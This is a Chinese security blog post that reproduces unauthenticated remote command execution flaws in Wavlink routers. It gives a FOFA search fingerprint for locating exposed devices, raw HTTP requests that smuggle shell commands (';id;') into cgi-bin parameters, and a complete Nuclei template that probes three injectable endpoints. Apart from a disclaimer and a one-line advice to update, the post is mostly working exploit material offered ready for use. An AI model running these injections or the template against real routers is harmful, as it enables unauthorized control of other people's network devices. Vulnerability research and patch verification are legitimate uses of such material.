#  【漏洞复现】睿因科技-wavlink-路由器-多处前台RCE   
原创 rain  知黑守白   2024-01-06 08:25  
  
免责声明  
  
  
![](https://mmbiz.qpic.cn/mmbiz_gif/SaibaRNhOjqg4CicjYhkyn7j8xeutLIIGlA3Pam1Oxz5ujOUsmPibr5J9NCiagtp8nGEEXPeJiaUeWkN3v1XXSS9Vfw/640?wx_fmt=gif&wxfrom=5&wx_lazy=1 "")  
  
  
  
**此内容仅供技术交流与学习，请勿用于未经授权的场景。请遵循相关法律与道德规范。任何因使用本文所述技术而引发的法律责任，与本文作者及发布平台无关。如有内容争议或侵权，请及时私信我们！**  
  
![](https://mmbiz.qpic.cn/mmbiz_gif/oMlX8Lll9JhtrlOVpAFwbbnTXyrqweQO0kKLSPTRtSL4MEXjM3TdHU1GMhb3ysoFV3ic9hKDLibzic6T7ADMnfNnA/640?wx_fmt=gif&wxfrom=5&wx_lazy=1 "")  
  
  
![](https://mmbiz.qpic.cn/mmbiz_gif/Ljib4So7yuWgmBny4eMeJJOramdTQiciaDu5LeMykBibiaorwCvYEX2sxq5lVYw4iaddx0qYlbQ6fAyXd22dcFOiads8w/640?wx_fmt=gif&wxfrom=5&wx_lazy=1 "")  
  
漏洞概述  
  
![](https://mmbiz.qpic.cn/mmbiz_gif/Ljib4So7yuWgmBny4eMeJJOramdTQiciaDuYRDXO8rZ2DX4p68v8aWfzp0XSlDyFJvENtj4DwOjoB5CaZVMPnfFYQ/640?wx_fmt=gif&wxfrom=5&wx_lazy=1 "")  
  
  
睿因（wavlink）路由器，cgi-bin下的多处接口存在命令执行漏洞，允许攻击者通过构造特制的请求包执行系统命令，从而获取未授权的访问权限。攻击者可以利用这个漏洞来获取敏感信息、篡改配置，甚至导致网络和设备的不可预测的损害  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/sicaib9ysOXg0aryLn9v4rorm4Q4ArIj00ic5qUqwpknjJuAj8NoRDSPdeKCzgP7FaU1uFCTDZzSt8ibbicZoQqbWuA/640?wx_fmt=png&from=appmsg "")  
  
![](https://mmbiz.qpic.cn/mmbiz_gif/Ljib4So7yuWgmBny4eMeJJOramdTQiciaDu5LeMykBibiaorwCvYEX2sxq5lVYw4iaddx0qYlbQ6fAyXd22dcFOiads8w/640?wx_fmt=gif&wxfrom=5&wx_lazy=1 "")  
  
FoFa  
  
![](https://mmbiz.qpic.cn/mmbiz_gif/Ljib4So7yuWgmBny4eMeJJOramdTQiciaDuYRDXO8rZ2DX4p68v8aWfzp0XSlDyFJvENtj4DwOjoB5CaZVMPnfFYQ/640?wx_fmt=gif&wxfrom=5&wx_lazy=1 "")  
  
```
icon_hash="-1350437236"
```  
  
![](https://mmbiz.qpic.cn/mmbiz_gif/Ljib4So7yuWgmBny4eMeJJOramdTQiciaDu5LeMykBibiaorwCvYEX2sxq5lVYw4iaddx0qYlbQ6fAyXd22dcFOiads8w/640?wx_fmt=gif&wxfrom=5&wx_lazy=1 "")  
  
漏洞复现  
  
![](https://mmbiz.qpic.cn/mmbiz_gif/Ljib4So7yuWgmBny4eMeJJOramdTQiciaDuYRDXO8rZ2DX4p68v8aWfzp0XSlDyFJvENtj4DwOjoB5CaZVMPnfFYQ/640?wx_fmt=gif&wxfrom=5&wx_lazy=1 "")  
```
POST /cgi-bin/mesh.cgi?page=upgrade&key=';id>.djm0sdjsyt.txt;' HTTP/1.1
Host: 
Content-Type: application/x-www-form-urlencoded
Accept-Encoding: gzip
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_3) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.0.3 Safari/605.1.15

page=night_led&start_hour=;id;
```  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/sicaib9ysOXg0aryLn9v4rorm4Q4ArIj00HOUbt6XHb0iatqeejIR4SWazNfRDDLaLXT9wOKLXoxiaCJzbnL7VZW4g/640?wx_fmt=png&from=appmsg "")  
```
GET /cgi-bin/.djm0sdjsyt.txt HTTP/1.1
Host: 
Accept-Encoding: gzip
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_3) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.0.3 Safari/605.1.15

```  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/sicaib9ysOXg0aryLn9v4rorm4Q4ArIj00KebspzLhZRIKIrY05jQuu3y0niac5FVOpPB8la5mGB5YRGX2CQH75GQ/640?wx_fmt=png&from=appmsg "")  
  
![](https://mmbiz.qpic.cn/mmbiz_gif/Ljib4So7yuWgmBny4eMeJJOramdTQiciaDu5LeMykBibiaorwCvYEX2sxq5lVYw4iaddx0qYlbQ6fAyXd22dcFOiads8w/640?wx_fmt=gif&wxfrom=5&wx_lazy=1 "")  
  
Nuclei Poc  
  
![](https://mmbiz.qpic.cn/mmbiz_gif/Ljib4So7yuWgmBny4eMeJJOramdTQiciaDuYRDXO8rZ2DX4p68v8aWfzp0XSlDyFJvENtj4DwOjoB5CaZVMPnfFYQ/640?wx_fmt=gif&wxfrom=5&wx_lazy=1 "")  
  
```
id: wavlink-rce-all

info:
  name: 睿因科技-wavlink-路由器-多处前台RCE
  author: rain
  severity: critical
  metadata:
    fofa-query: icon_hash="-1350437236"

variables:
  filename: "{{to_lower(rand_base(10))}}"


http:
  - raw:
      - |  
        POST /{{path}} HTTP/1.1
        Host: {{Hostname}}
        Content-Type: application/x-www-form-urlencoded
        Accept-Encoding: gzip
        User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_3) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.0.3 Safari/605.1.15
        
        page=night_led&start_hour=;id;
      - |
        GET /cgi-bin/.{{filename}}.txt HTTP/1.1
        Host:{{Hostname}}
        Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
        Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
        Accept-Encoding: gzip, deflate
        Upgrade-Insecure-Requests: 1
        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:121.0) Gecko/20100101 Firefox/121.0a/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36

    attack: batteringram
    payloads:
      path:
        - /cgi-bin/nightled.cgi
        - /cgi-bin/live_api.cgi?page=abc&id=173&ip=;id;
        - /cgi-bin/mesh.cgi?page=upgrade&key=';id>.{{filename}}.txt;'

    stop-at-first-match: true
    matchers:
      - type: dsl
        dsl:
          - contains_all(body, "uid=")

```  
  
  
![](https://mmbiz.qpic.cn/mmbiz_gif/Ljib4So7yuWgmBny4eMeJJOramdTQiciaDu5LeMykBibiaorwCvYEX2sxq5lVYw4iaddx0qYlbQ6fAyXd22dcFOiads8w/640?wx_fmt=gif&wxfrom=5&wx_lazy=1 "")  
  
修复建议  
  
![](https://mmbiz.qpic.cn/mmbiz_gif/Ljib4So7yuWgmBny4eMeJJOramdTQiciaDuYRDXO8rZ2DX4p68v8aWfzp0XSlDyFJvENtj4DwOjoB5CaZVMPnfFYQ/640?wx_fmt=gif&wxfrom=5&wx_lazy=1 "")  
  
  
更新至最新版本：确保你的系统版本处于最新状态。厂商通常会发布包含安全修复的更新，及时应用这些更新以确保系统的安全性。  
  
